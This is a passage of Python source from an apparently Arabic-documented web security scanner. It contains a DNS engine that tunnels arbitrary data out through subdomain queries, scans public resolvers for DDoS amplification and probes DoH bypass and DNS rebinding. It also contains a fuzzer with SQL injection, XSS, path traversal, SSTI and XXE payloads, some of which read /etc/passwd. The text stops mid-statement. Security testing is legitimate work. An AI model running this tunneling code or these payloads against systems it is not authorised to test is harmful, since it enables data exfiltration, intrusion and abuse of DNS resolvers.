    محرك DNS متكامل يدعم أسلوبين رئيسيين:

    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    الأسلوب أ — DNS Tunneling (نفق DNS)
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    إخفاء بيانات تعسفية داخل استعلامات DNS عادية لتجاوز الجدران
    النارية التي تسمح فقط بحركة DNS (UDP/53).

    آلية العمل:
      الإرسال:  يُشفَّر الحمولة بـ Base32 (آمن لأسماء نطاقات DNS)
                ويُضمَّن كـ subdomain → data.chunk.tunnel.yourdomain.com
      الاستقبال: خادم DNS مراقَب يُفك تشفير الـ subdomain ويستخرج البيانات.

    الاستخدامات الأمنية:
      - اختبار ما إذا كانت الجدران النارية تفحص محتوى DNS.
      - اكتشاف قنوات خروج (exfiltration channels) مخفية في البيئة.
      - تقييم مدى فعالية DNS Inspection في حلول CASB/SASE.

    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    الأسلوب ب — DNS Amplification Probe (فحص تضخيم DNS)
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    فحص وجود خوادم DNS مفتوحة (Open Resolvers) قابلة للاستغلال
    في هجمات تضخيم DDoS، وقياس نسبة التضخيم الفعلية.

    آلية العمل:
      إرسال استعلام DNS صغير (ANY أو DNSKEY) إلى الخادم المستهدف
      وقياس حجم الرد مقارنةً بالطلب ← نسبة التضخيم (Amplification Factor).

    معامل التضخيم:  AF = حجم_الرد / حجم_الطلب
      AF > 10:  مقبول
      AF > 50:  خطر متوسط
      AF > 100: خطر عالٍ جداً (CVE-2023-xxxx نمط)

    متطلبات: scapy (للوحدة الكاملة) أو socket Python (للـ fallback).
    متطلبات اختيارية: dnspython (pip install dnspython).
    """

    # ── ثوابت البروتوكول ──────────────────────────────────────────────
    DNS_PORT: int     = 53
    MAX_LABEL_LEN: int = 63        # حد طول label واحد في DNS
    MAX_NAME_LEN: int  = 253       # حد طول اسم النطاق الكامل
    # حجم chunk يتناسب مع Base32: كل 5 بايت → 8 محارف Base32
    CHUNK_BYTES: int   = 30        # 30 بايت → 48 محرف Base32 (ضمن 63)

    # ── أنواع الاستعلام للتضخيم ────────────────────────────────────────
    AMPLIFICATION_QTYPES: List[str] = [
        "ANY", "DNSKEY", "NS", "MX", "TXT", "SOA", "AAAA",
    ]

    # ── خوادم DNS عامة للاختبار ────────────────────────────────────────
    PUBLIC_RESOLVERS: List[str] = [
        "8.8.8.8",        # Google
        "1.1.1.1",        # Cloudflare
        "9.9.9.9",        # Quad9
        "208.67.222.222", # OpenDNS
        "64.6.64.6",      # Verisign
        "77.88.8.8",      # Yandex
        "8.26.56.26",     # Comodo
    ]

    def __init__(
        self,
        tunnel_domain: str = "tunnel.example.com",
        dns_server: str = "8.8.8.8",
        timeout: float = 3.0,
        encoding: str = "base32",
        inter_query_delay: float = 0.05,
    ):
        """
        Args:
            tunnel_domain:      النطاق الأساسي الذي يُستخدم في النفق
                                (يجب أن يكون تحت سيطرتك في بيئة حقيقية).
            dns_server:         خادم DNS المستهدف للاستعلام.
            timeout:            مهلة الانتظار لكل استعلام (ثانية).
            encoding:           طريقة ترميز البيانات ('base32' أو 'hex').
            inter_query_delay:  تأخير بين الاستعلامات المتتالية (ثانية).
        """
        self.tunnel_domain     = tunnel_domain.strip(".")
        self.dns_server        = dns_server
        self.timeout           = timeout
        self.encoding          = encoding.lower()
        self.inter_query_delay = inter_query_delay
        self._query_log: List[Dict[str, Any]] = []
        self._tunnel_log: List[Dict[str, Any]] = []

    # ════════════════════════════════════════════════════════════════════
    #  قسم أ: DNS TUNNELING
    # ════════════════════════════════════════════════════════════════════

    # ── ترميز البيانات لاسم نطاق DNS ────────────────────────────────
    def encode_payload(self, data: bytes) -> List[str]:
        """
        رمّز بيانات تعسفية إلى قائمة subdomains آمنة لـ DNS.

        الخطوات:
          1. تقسيم البيانات إلى chunks بحجم CHUNK_BYTES.
          2. ترميز كل chunk بـ Base32 (أحرف صغيرة).
          3. إضافة رقم تسلسلي بنظام hex في البداية لإعادة الترتيب.
          4. تجميع كل chunk مع النطاق الأساسي.

        Args:
            data: البيانات الخام (bytes).

        Returns:
            قائمة أسماء FQDN جاهزة للإرسال كاستعلامات DNS.
        """
        fqdns  = []
        chunks = [
            data[i:i + self.CHUNK_BYTES]
            for i in range(0, len(data), self.CHUNK_BYTES)
        ]
        for idx, chunk in enumerate(chunks):
            if self.encoding == "base32":
                encoded = base64.b32encode(chunk).decode().lower().rstrip("=")
            else:
                encoded = chunk.hex()
            # رقم تسلسلي بـ 4 أرقام hex: 0000–ffff
            seq     = f"{idx:04x}"
            label   = f"{seq}{encoded}"
            # قسّم إذا تجاوز 63 محرفاً (حد الـ label)
            labels  = [
                label[i:i + self.MAX_LABEL_LEN]
                for i in range(0, len(label), self.MAX_LABEL_LEN)
            ]
            fqdn    = ".".join(labels) + f".{self.tunnel_domain}"
            # تحقق من الحد الكلي 253
            if len(fqdn) <= self.MAX_NAME_LEN:
                fqdns.append(fqdn)
            else:
                # تقليص طول الـ label إذا تجاوز الحد
                fqdns.append(fqdn[:self.MAX_NAME_LEN])
        return fqdns

    # ── فك ترميز subdomains إلى بيانات ──────────────────────────────
    @staticmethod
    def decode_payload(fqdns: List[str], tunnel_domain: str, encoding: str = "base32") -> bytes:
        """
        أعِد تجميع البيانات من قائمة subdomains DNS.

        Args:
            fqdns:         قائمة FQDN كما أُرسلت.
            tunnel_domain: النطاق الأساسي (لاستئصاله).
            encoding:      طريقة الترميز ('base32' أو 'hex').

        Returns:
            البيانات الأصلية مُعادة التجميع.
        """
        domain_suffix = f".{tunnel_domain.strip('.')}"
        chunks: Dict[int, bytes] = {}
        for fqdn in fqdns:
            # أزل النطاق الأساسي
            label_part = fqdn.replace(domain_suffix, "").replace(".", "")
            if len(label_part) < 4:
                continue
            seq_hex = label_part[:4]
            encoded = label_part[4:]
            try:
                idx = int(seq_hex, 16)
                if encoding == "base32":
                    padding = (8 - len(encoded) % 8) % 8
                    encoded += "=" * padding
                    chunk = base64.b32decode(encoded.upper())
                else:
                    chunk = bytes.fromhex(encoded)
                chunks[idx] = chunk
            except Exception:
                continue
        # إعادة التجميع بالترتيب
        result = b""
        for i in sorted(chunks.keys()):
            result += chunks[i]
        return result

    # ── إرسال بيانات عبر نفق DNS (raw socket) ───────────────────────
    def tunnel_send(self, data: bytes) -> Dict[str, Any]:
        """
        أرسل بيانات عبر نفق DNS باستخدام استعلامات A record.

        كل استعلام يحمل chunk مشفّر كـ subdomain.
        الخادم المُستلِم يجب أن يُحلّل هذه الاستعلامات.

        Args:
            data: البيانات المراد إرسالها (bytes).

        Returns:
            dict بإحصائيات النفق.
        """
        fqdns      = self.encode_payload(data)
        sent       = 0
        failed     = 0
        total_sent = len(data)
        log("INFO",
            f"[DNS-Tunnel] Sending {total_sent}B in {len(fqdns)} DNS queries "
            f"via {self.dns_server}:{self.DNS_PORT} | domain={self.tunnel_domain}"
        )
        for fqdn in fqdns:
            try:
                result = self._send_dns_query_raw(
                    fqdn, qtype=1,  # A record
                    server=self.dns_server,
                )
                self._tunnel_log.append({
                    "fqdn":    fqdn,
                    "status":  "sent" if result else "timeout",
                    "len":     len(fqdn),
                    "ts":      time.time(),
                })
                sent += 1
            except Exception as e:
                failed += 1
                self._tunnel_log.append({
                    "fqdn":   fqdn,
                    "status": f"error:{e}",
                    "len":    len(fqdn),
                    "ts":     time.time(),
                })
            time.sleep(self.inter_query_delay)

        log("OK",
            f"[DNS-Tunnel] Complete: {sent} sent, {failed} failed | "
            f"{total_sent}B tunneled in {len(fqdns)} queries"
        )
        return {
            "total_bytes":   total_sent,
            "queries_sent":  sent,
            "queries_failed":failed,
            "fqdns":         fqdns,
            "encoding":      self.encoding,
        }

    # ── إرسال استعلام DNS خام (raw socket UDP) ───────────────────────
    def _send_dns_query_raw(
        self,
        name: str,
        qtype: int = 1,
        server: str = None,
        server_port: int = None,
    ) -> Optional[bytes]:
        """
        أرسل استعلام DNS خام عبر UDP socket Python القياسي.
        لا يتطلب Scapy أو dnspython.

        بنية رسالة DNS (RFC 1035):
          2B: Transaction ID
          2B: Flags (standard query)
          2B: QDCOUNT=1
          2B: ANCOUNT=0
          2B: NSCOUNT=0
          2B: ARCOUNT=0
          N:  QNAME  (encoded labels)
          2B: QTYPE
          2B: QCLASS=IN(1)

        Args:
            name:   اسم النطاق المراد الاستعلام عنه.
            qtype:  نوع السجل (1=A, 28=AAAA, 255=ANY, 48=DNSKEY, ...).
            server: خادم DNS.

        Returns:
            رسالة الرد كـ bytes أو None عند timeout.
        """
        srv  = server or self.dns_server
        port = server_port or self.DNS_PORT
        txid = random.randint(0, 65535)

        # بناء حقل QNAME
        qname_bytes = b""
        for label in name.rstrip(".").split("."):
            encoded_label = label.encode("ascii", errors="replace")[:63]
            qname_bytes  += bytes([len(encoded_label)]) + encoded_label
        qname_bytes += b"\x00"  # نهاية الاسم

        # بناء الرسالة الكاملة
        header = struct.pack(
            "!HHHHHH",
            txid,   # Transaction ID
            0x0100, # Flags: Standard Query, RD=1
            1,      # QDCOUNT
            0, 0, 0 # ANCOUNT, NSCOUNT, ARCOUNT
        )
        question = qname_bytes + struct.pack("!HH", qtype, 1)  # QTYPE, QCLASS=IN
        message  = header + question

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(self.timeout)
            sock.sendto(message, (srv, port))
            reply, _ = sock.recvfrom(4096)
            sock.close()
            return reply
        except socket.timeout:
            return None
        except Exception:
            return None

    # ── استخراج حجم الرد من رسالة DNS خام ──────────────────────────
    @staticmethod
    def _parse_dns_response_size(response: bytes) -> int:
        """أعِد الحجم الكلي لرسالة DNS بالبايت."""
        return len(response) if response else 0

    # ── فحص نفق DNS (هل يصل استعلام مُخفَّن إلى الطرف الآخر؟) ──────
    def probe_tunnel_viability(self, test_payload: bytes = None) -> Dict[str, Any]:
        """
        اختبر جدوى نفق DNS عبر إرسال حمولة اختبارية وفحص إذا كانت
        الاستعلامات تصل إلى خادم DNS دون فلترة.

        الهدف: تحديد إذا كانت بيئة الهدف تسمح بنفق DNS أم لا.

        Returns:
            dict يحتوي على النتيجة والإحصائيات.
        """
        payload = test_payload or b"WebScout-DNS-Tunnel-Probe-v24"
        fqdns   = self.encode_payload(payload)
        results = []
        log("INFO",
            f"[DNS-Tunnel] Probing tunnel viability → "
            f"{self.dns_server} | {len(fqdns)} queries"
        )
        for fqdn in fqdns[:3]:  # أرسل أول 3 فقط للفحص السريع
            reply = self._send_dns_query_raw(fqdn, qtype=1)
            reached = reply is not None
            results.append({
                "fqdn":    fqdn,
                "reached": reached,
                "reply_len": len(reply) if reply else 0,
            })
        viable  = any(r["reached"] for r in results)
        blocked = all(not r["reached"] for r in results)
        verdict = (
            "VIABLE"  if viable and not blocked else
            "BLOCKED" if blocked else
            "PARTIAL"
        )
        log(
            "OK" if verdict == "VIABLE" else "WARN",
            f"[DNS-Tunnel] Viability: {verdict} | "
            f"reached={sum(r['reached'] for r in results)}/{len(results)}"
        )
        return {
            "verdict":     verdict,
            "dns_server":  self.dns_server,
            "domain":      self.tunnel_domain,
            "probes":      results,
            "viable":      viable,
        }

    # ── نفق DNS للبيانات النصية ─────────────────────────────────────
    def tunnel_text(self, text: str, charset: str = "utf-8") -> Dict[str, Any]:
        """اختصار لـ tunnel_send() للنصوص."""
        return self.tunnel_send(text.encode(charset))

    # ════════════════════════════════════════════════════════════════════
    #  قسم ب: DNS AMPLIFICATION PROBE
    # ════════════════════════════════════════════════════════════════════

    # ── فحص خادم DNS مفرد ───────────────────────────────────────────
    def probe_amplification(
        self,
        server: str,
        qname: str = ".",
        qtype_str: str = "ANY",
        port: int = 53,
    ) -> Dict[str, Any]:
        """
        افحص خادم DNS واحد لقياس نسبة التضخيم.

        Args:
            server:   عنوان IP الخادم.
            qname:    اسم النطاق للاستعلام (افتراضي: "." = root).
            qtype_str:نوع السجل كنص ("ANY", "DNSKEY", "NS", ...).
            port:     منفذ DNS.

        Returns:
            dict يحتوي على نسبة التضخيم والتصنيف الأمني.
        """
        qtype_map = {
            "A": 1, "NS": 2, "CNAME": 5, "SOA": 6,
            "MX": 15, "TXT": 16, "AAAA": 28,
            "ANY": 255, "DNSKEY": 48, "DS": 43,
        }
        qtype = qtype_map.get(qtype_str.upper(), 255)

        # بناء الاستعلام وحساب حجمه
        dummy_name  = qname if qname else "."
        request_raw = self._build_query_bytes(dummy_name, qtype)
        req_size    = len(request_raw)

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(self.timeout)
            sock.sendto(request_raw, (server, port))
            reply, _ = sock.recvfrom(65535)
            sock.close()
            rep_size = len(reply)
        except socket.timeout:
            return {
                "server":   server,
                "qtype":    qtype_str,
                "status":   "timeout",
                "req_size": req_size,
                "rep_size": 0,
                "factor":   0.0,
                "severity": "INFO",
            }
        except Exception as e:
            return {
                "server":   server,
                "qtype":    qtype_str,
                "status":   f"error:{e}",
                "req_size": req_size,
                "rep_size": 0,
                "factor":   0.0,
                "severity": "INFO",
            }

        factor   = rep_size / max(req_size, 1)
        severity = self._amplification_severity(factor)
        result   = {
            "server":    server,
            "qtype":     qtype_str,
            "qname":     dummy_name,
            "status":    "open_resolver" if factor > 5 else "limited",
            "req_size":  req_size,
            "rep_size":  rep_size,
            "factor":    round(factor, 2),
            "severity":  severity,
            "is_open":   factor > 5,
            "port":      port,
        }
        log(
            "VULN" if severity in ("CRITICAL", "HIGH") else "INFO",
            f"[DNS-Amp] {server}:{port} | qtype={qtype_str} | "
            f"{req_size}B→{rep_size}B | AF={factor:.1f}x | {severity}"
        )
        self._query_log.append(result)
        return result

    # ── بناء رسالة DNS query كـ bytes ───────────────────────────────
    def _build_query_bytes(self, name: str, qtype: int) -> bytes:
        """بناء استعلام DNS خام كـ bytes لحساب الحجم الدقيق."""
        txid = random.randint(0, 65535)
        # QNAME
        qname_bytes = b""
        for label in name.rstrip(".").split("."):
            if not label:
                continue
            enc = label.encode("ascii", errors="replace")[:63]
            qname_bytes += bytes([len(enc)]) + enc
        qname_bytes += b"\x00"
        header   = struct.pack("!HHHHHH", txid, 0x0100, 1, 0, 0, 1)
        question = qname_bytes + struct.pack("!HH", qtype, 1)
        # EDNS0 OPT record لتكبير حجم الطلب (RFC 6891)
        edns0_opt = struct.pack("!HHHIH", 0, 41, 4096, 0, 0)
        return header + question + edns0_opt

    # ── تصنيف نسبة التضخيم ──────────────────────────────────────────
    @staticmethod
    def _amplification_severity(factor: float) -> str:
        """صنّف نسبة التضخيم بحسب خطورتها."""
        if factor >= 100:
            return "CRITICAL"
        elif factor >= 50:
            return "HIGH"
        elif factor >= 10:
            return "MEDIUM"
        elif factor >= 5:
            return "LOW"
        else:
            return "INFO"

    # ── فحص قائمة خوادم DNS ─────────────────────────────────────────
    def scan_open_resolvers(
        self,
        servers: List[str] = None,
        qtypes: List[str] = None,
        target_qname: str = ".",
    ) -> List[Dict[str, Any]]:
        """
        افحص قائمة خوادم DNS للكشف عن Open Resolvers القابلة
        للاستغلال في هجمات تضخيم DDoS.

        Args:
            servers:      قائمة عناوين IP (None = استخدام PUBLIC_RESOLVERS).
            qtypes:       أنواع الاستعلام للاختبار (None = كل الأنواع).
            target_qname: اسم النطاق للاستعلام (افتراضي: root ".").

        Returns:
            قائمة نتائج مصنّفة حسب الخطورة.
        """
        srv_list   = servers or self.PUBLIC_RESOLVERS
        qtype_list = qtypes  or self.AMPLIFICATION_QTYPES
        findings   = []
        log("SCAN",
            f"[DNS-Amp] Scanning {len(srv_list)} servers × "
            f"{len(qtype_list)} query types | qname={target_qname}"
        )
        for server in srv_list:
            best_factor = 0.0
            best_result = None
            for qtype in qtype_list:
                result = self.probe_amplification(
                    server=server, qname=target_qname, qtype_str=qtype
                )
                if result["factor"] > best_factor:
                    best_factor = result["factor"]
                    best_result = result
                time.sleep(self.inter_query_delay)
            if best_result:
                findings.append(best_result)
        # ترتيب حسب أعلى نسبة تضخيم
        findings.sort(key=lambda x: x["factor"], reverse=True)
        open_resolvers = [f for f in findings if f.get("is_open")]
        log(
            "VULN" if open_resolvers else "OK",
            f"[DNS-Amp] Found {len(open_resolvers)} open resolvers "
            f"(max AF={findings[0]['factor']:.1f}x)" if findings else
            "[DNS-Amp] No resolvers responded"
        )
        return findings

    # ── فحص منفذ DNS مخصص (DNS over non-standard port) ──────────────
    def probe_nonstandard_ports(
        self,
        server: str,
        ports: List[int] = None,
        qname: str = "google.com",
    ) -> List[Dict[str, Any]]:
        """
        افحص خادم DNS على منافذ غير قياسية (5353, 5335, 8853, ...).
        بعض أجهزة الشبكة تُشغّل DNS على منافذ غير معتادة مما
        يُمكّن تجاوز قواعد الجدار الناري المخصصة للمنفذ 53.

        Args:
            server: عنوان IP الخادم.
            ports:  قائمة المنافذ (None = قائمة افتراضية).

        Returns:
            قائمة النتائج لكل منفذ.
        """
        check_ports = ports or [53, 5353, 5335, 8853, 853, 1053, 4053, 9953]
        results     = []
        log("INFO",
            f"[DNS-Ports] Probing {server} on {len(check_ports)} ports"
        )
        for port in check_ports:
            try:
                query = self._build_query_bytes(qname, qtype=1)  # A record
                sock  = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(1.5)
                sock.sendto(query, (server, port))
                reply, _ = sock.recvfrom(4096)
                sock.close()
                active = len(reply) > 0
            except Exception:
                active = False
                reply  = b""
            result = {
                "server": server,
                "port":   port,
                "active": active,
                "rep_len":len(reply),
                "standard": port == 53,
            }
            if active and port != 53:
                log("WARN",
                    f"[DNS-Ports] Non-standard DNS port OPEN: {server}:{port}"
                )
            results.append(result)
        return results

    # ════════════════════════════════════════════════════════════════════
    #  قسم ج: DNS-OVER-HTTPS / DNS-OVER-TLS DETECTION
    # ════════════════════════════════════════════════════════════════════

    async def probe_doh_server(
        self,
        doh_url: str = "https://cloudflare-dns.com/dns-query",
        qname: str = "example.com",
        qtype: str = "A",
        client: Any = None,
    ) -> Dict[str, Any]:
        """
        اختبر خادم DNS-over-HTTPS (DoH) للكشف عن إمكانية استخدامه
        كقناة خروج مشفرة تتجاوز فحص DNS التقليدي.

        Args:
            doh_url: رابط خادم DoH.
            qname:   اسم النطاق للاستعلام.
            qtype:   نوع السجل.
            client:  WebScoutClient (اختياري، يُستخدم إذا متاح).

        Returns:
            dict بنتائج فحص DoH.
        """
        # بناء استعلام DNS/HTTPS (wireformat) مشفر
        qtype_num = {"A": 1, "AAAA": 28, "MX": 15, "TXT": 16,
                     "NS": 2, "ANY": 255}.get(qtype.upper(), 1)
        query_bytes = self._build_query_bytes(qname, qtype_num)
        encoded_q   = base64.urlsafe_b64encode(query_bytes).rstrip(b"=").decode()
        url         = f"{doh_url}?dns={encoded_q}"
        headers     = {
            "accept":       "application/dns-message",
            "content-type": "application/dns-message",
        }
        log("INFO", f"[DoH] Probing {doh_url} | qname={qname} qtype={qtype}")
        try:
            if client is not None:
                r = await client.get(url, extra_headers=headers)
                status   = r["status"] if r else 0
                rep_size = len(r["text"]) if r else 0
                working  = status == 200
            else:
                # Fallback: aiohttp مباشر
                import aiohttp
                async with aiohttp.ClientSession() as session:
                    async with session.get(url, headers=headers,
                                           timeout=aiohttp.ClientTimeout(total=self.timeout),
                                           ssl=False) as resp:
                        data     = await resp.read()
                        status   = resp.status
                        rep_size = len(data)
                        working  = status == 200
        except Exception as e:
            status   = 0
            rep_size = 0
            working  = False
            log("WARN", f"[DoH] Error: {e}")

        result = {
            "url":       doh_url,
            "qname":     qname,
            "qtype":     qtype,
            "status":    status,
            "rep_size":  rep_size,
            "working":   working,
            "bypass_risk": "HIGH" if working else "NONE",
        }
        log(
            "VULN" if working else "OK",
            f"[DoH] {doh_url} → status={status} | "
            f"{'WORKING (bypass risk!)' if working else 'not working'}"
        )
        return result

    # ── فحص قائمة خوادم DoH المعروفة ───────────────────────────────
    async def scan_doh_servers(
        self,
        client: Any = None,
        qname: str = "example.com",
    ) -> List[Dict[str, Any]]:
        """
        افحص قائمة خوادم DoH المعروفة للكشف عن قنوات الخروج المشفرة.

        Returns:
            قائمة نتائج فحص DoH.
        """
        doh_servers = [
            "https://cloudflare-dns.com/dns-query",
            "https://dns.google/dns-query",
            "https://dns.quad9.net/dns-query",
            "https://doh.opendns.com/dns-query",
            "https://dns.adguard.com/dns-query",
            "https://doh.cleanbrowsing.org/doh/security-filter",
            "https://doh.dns.sb/dns-query",
            "https://dns.nextdns.io",
        ]
        results = []
        for url in doh_servers:
            r = await self.probe_doh_server(
                doh_url=url, qname=qname, client=client
            )
            results.append(r)
            await asyncio.sleep(self.inter_query_delay)
        working_count = sum(1 for r in results if r["working"])
        log(
            "VULN" if working_count > 0 else "OK",
            f"[DoH] {working_count}/{len(doh_servers)} DoH servers reachable "
            "(potential DNS tunnel bypass vectors)"
        )
        return results

    # ════════════════════════════════════════════════════════════════════
    #  قسم د: DNS REBINDING PROBE
    # ════════════════════════════════════════════════════════════════════

    def probe_dns_rebinding_risk(
        self,
        target_ip: str,
        internal_ranges: List[str] = None,
    ) -> Dict[str, Any]:
        """
        افحص إمكانية هجوم DNS Rebinding عبر التحقق مما إذا كان
        الخادم المستهدف يُعيد رد DNS يشير إلى عناوين IP داخلية.

        آلية DNS Rebinding:
          المهاجم يتحكم في خادم DNS يُجيب أولاً بعنوان IP صحيح ثم
          يُغيّر الرد ليشير إلى 127.0.0.1 أو 192.168.x.x بعد
          انتهاء صلاحية الـ TTL (TTL=0 أو 1 ثانية).

        Args:
            target_ip:       عنوان IP الهدف.
            internal_ranges: نطاقات IP الداخلية للفحص.

        Returns:
            dict بنتائج فحص rebinding.
        """
        internal = internal_ranges or [
            "127.", "192.168.", "10.", "172.16.", "172.17.",
            "172.18.", "172.19.", "172.20.", "172.21.", "172.22.",
            "172.23.", "172.24.", "172.25.", "172.26.", "172.27.",
            "172.28.", "172.29.", "172.30.", "172.31.",
            "169.254.",  # Link-local
            "::1",       # IPv6 loopback
        ]
        is_internal = any(target_ip.startswith(r) for r in internal)
        # فحص TTL من استعلام DNS
        test_domain = f"rebind-test.{self.tunnel_domain}"
        reply       = self._send_dns_query_raw(test_domain, qtype=1,
                                               server=self.dns_server)
        low_ttl     = False
        resolved_ip = None
        if reply and len(reply) > 12:
            # محاولة قراءة TTL من أول سجل إجابة (offset بسيط)
            try:
                # skip header (12B) + question section
                # (تحليل مبسّط — سجل A هو 4 بايت في نهاية السجل)
                if len(reply) >= 28:
                    ttl_raw = struct.unpack("!I", reply[-10:-6])[0]
                    low_ttl = ttl_raw <= 5
                    # آخر 4 بايت = عنوان IP إذا كان A record
                    ip_raw  = reply[-4:]
                    resolved_ip = ".".join(str(b) for b in ip_raw)
            except Exception:
                pass
        risk = "HIGH" if (is_internal or low_ttl) else "LOW"
        result = {
            "target_ip":   target_ip,
            "is_internal": is_internal,
            "low_ttl":     low_ttl,
            "resolved_ip": resolved_ip,
            "rebinding_risk": risk,
            "notes": (
                "عنوان IP داخلي — خطر DNS Rebinding مرتفع"
                if is_internal else
                "TTL منخفض جداً — قد يكون خادم DNS Rebinding"
                if low_ttl else
                "لم يُكتشف خطر مباشر"
            ),
        }
        log(
            "VULN" if risk == "HIGH" else "OK",
            f"[DNS-Rebind] {target_ip} | internal={is_internal} | "
            f"low_ttl={low_ttl} | risk={risk}"
        )
        return result

    # ════════════════════════════════════════════════════════════════════
    #  تقارير وإحصائيات
    # ════════════════════════════════════════════════════════════════════

    def report_tunnel(self) -> Dict[str, Any]:
        """تقرير نفق DNS."""
        return {
            "tunnel_domain":  self.tunnel_domain,
            "dns_server":     self.dns_server,
            "encoding":       self.encoding,
            "queries_sent":   len(self._tunnel_log),
            "log":            self._tunnel_log,
        }

    def report_amplification(self) -> Dict[str, Any]:
        """تقرير فحص التضخيم."""
        if not self._query_log:
            return {"open_resolvers": [], "total_scanned": 0}
        open_rs = [q for q in self._query_log if q.get("is_open")]
        return {
            "total_scanned":  len(self._query_log),
            "open_resolvers": open_rs,
            "max_factor":     max(q["factor"] for q in self._query_log),
            "avg_factor":     round(
                sum(q["factor"] for q in self._query_log) / len(self._query_log), 2
            ),
            "critical":       [q for q in open_rs if q["severity"] == "CRITICAL"],
            "high":           [q for q in open_rs if q["severity"] == "HIGH"],
        }

    def full_report(self) -> Dict[str, Any]:
        """تقرير شامل لكل أقسام المحرك."""
        return {
            "tunnel":        self.report_tunnel(),
            "amplification": self.report_amplification(),
        }


class AdvancedFuzzer:
    """Recursive parameter discovery and multi-parameter injection."""
    PAYLOAD_CATEGORIES = {
        "sqli": ["'", '"', "' OR '1'='1", "' UNION SELECT NULL--"],
        "xss": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"],
        "path_traversal": ["../../../etc/passwd", "..\\..\\..\\windows\\win.ini"],
        "ssti": ["{{7*7}}", "${7*7}", "*{7*7}"],
        "xxe": ['<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>'],
    }

    # Hard cap on the total number of HTTP requests during recursive discovery.
    # With depth=3 and 20 child URLs per level, the theoretical worst case is
    # 1 + 20 + 400 + 8000 = 8421 requests — far too many.  Cap at 500.
    _DISCOVER_MAX_REQUESTS = 500

    async def discover_params(self, client: WebScoutClient, url: str,
                              _visited: set = None, _depth: int = 0,
                              _req_counter: list = None) -> dict:
        """Recursively discover parameters by walking internal links (max depth 3).

        Extracts:
        - HTML ``<input name="...">`` fields
        - ``data-*`` attributes
        - Query-string parameters from ``href`` links
        - JSON response keys (when Content-Type is application/json)

        Recursion is bounded to ``_depth <= 3`` and at most 20 unique child URLs
        per level to keep runtime manageable.  A hard cap of _DISCOVER_MAX_REQUESTS
        total requests prevents runaway crawls on sites with many internal links.
        """
        if _visited is None:
            _visited = set()
        if _req_counter is None:
            _req_counter = [0]  # mutable counter shared across recursion
        discovered: dict = {}
        norm_url = url.split("?")[0]
        if norm_url in _visited or _depth > 3:
            return discovered
        if _req_counter[0] >= self._DISCOVER_MAX_REQUESTS:
            log("DEBUG", f"discover_params: request cap ({self._DISCOVER_MAX_REQUESTS}) reached — stopping crawl")
            return discovered
        _visited.add(norm_url)
        _req_counter[0] += 1

        r = await client.get(url)
        if not r:
            return discovered

        body = r["text"]

        # --- Extract <input name="..."> fields ---
        for match in re.finditer(r'<input[^>]+name=["\']([^"\']+)["\']', body, re.I):
            discovered[match.group(1)] = ""

        # --- Extract data-* attributes ---
        for match in re.finditer(r'data-([a-zA-Z0-9_-]+)=["\']([^"\']*)["\']', body):
            discovered[match.group(1)] = match.group(2)

        # --- Extract query-string parameters from internal href links ---
        child_urls: list = []
        parsed_base = urlparse(url)
        for match in re.finditer(r'href=["\']([^"\']+)["\']', body, re.I):
            href = match.group(1)
            # Resolve relative links
            if href.startswith(("http://", "https://")):
                full = href
            elif href.startswith("/"):
                full = f"{parsed_base.scheme}://{parsed_base.netloc}{href}"
            else:
                continue
            # Only follow same-origin links
            if urlparse(full).netloc != parsed_base.netloc:
                continue
            fp = urlparse(full)
            if fp.query:
                for param in parse_qs(fp.query):
                    discovered[param] = ""
            norm_child = full.split("?")[0]
            if norm_child not in _visited:
                child_urls.append(full)

        # --- JSON API response keys ---
        ct = r["headers"].get("content-type", r["headers"].get("Content-Type", ""))
        if "application/json" in ct:
            try:
                data = json.loads(body)
                if isinstance(data, dict):
                    discovered.update({k: "" for k in data})
            except (json.JSONDecodeError, ValueError):
                pass

        # --- Recurse into child pages (bounded) ---
        for child in child_urls[:20]:
            if _req_counter[0] >= self._DISCOVER_MAX_REQUESTS:
                break
            child_params = await self.discover_params(
                client, child, _visited=_visited, _depth=_depth + 1,
                _req_counter=_req_counter)
            discovered.update(child_params)

        return discovered

    async def fuzz(self, client: WebScoutClient, url: str, params: dict, categories: list = None) -> list:
        findings = []
        parsed = urlparse(url)
        if categories is None:
            categories = list(self.PAYLOAD_CATEGORIES.keys())

        for param in params:
            for cat in categories:
                for payload in self.PAYLOAD_CATEGORIES[cat]:
                    np = {**dict(parse_qs(parsed.query)), param: [payload]}
                    test_url = urlunparse(parsed._replace(query=urlencode(np, doseq=True)))
                    r = await client.get(test_url)
                    if not r:
                        continue
                    body = r["text"]
                    # Payload must appear literally in response
                    if payload not in body:
                        continue
                    # For XSS/injection: ensure payload is NOT HTML-encoded in any form.
                    # Applications may use named references (&lt; &gt; &amp; &quot;),
                    # decimal numeric references (&#60; &#62;), or hex references (&#x3C; &#x3E;).
                    encoded_check = (
                        payload.replace("<", "&lt;").replace(">", "&gt;") in body
                        or payload.replace("<", "&#60;").replace(">", "&#62;") in body
                        or payload.replace("<", "&#x3C;").replace(">", "&#x3E;") in body
                        or payload.replace("<", "&#x3c;").replace(">", "&#x3e;") in body
                        or payload.replace("\"", "&quot;").replace("'", "&#39;") in body
                    )
                    if encoded_check:
                        continue
                    # For SQLi: require actual error string evidence, not just reflection
                    if cat == "sqli":
                        sql_errors = ["sql syntax", "ora-", "pg_query", "mysql_fetch",
                                      "sqlite_", "sqlstate", "unterminated", "syntax error"]
                        if not any(e in body.lower() for e in sql_errors):
                            continue
                    # For SSTI: require math was evaluated (49 for {{7*7}}, 49 for ${7*7})
                    if cat == "ssti":
                        if "49" not in body and "7" not in body:
                            continue
                    findings.append(Finding(
                        plugin="advanced_fuzzer",
                        title=f"Confirmed {cat.upper()} payload reflection via '{param}'",
                        severity="HIGH" if cat in ("sqli","ssti","xxe") else "MEDIUM",
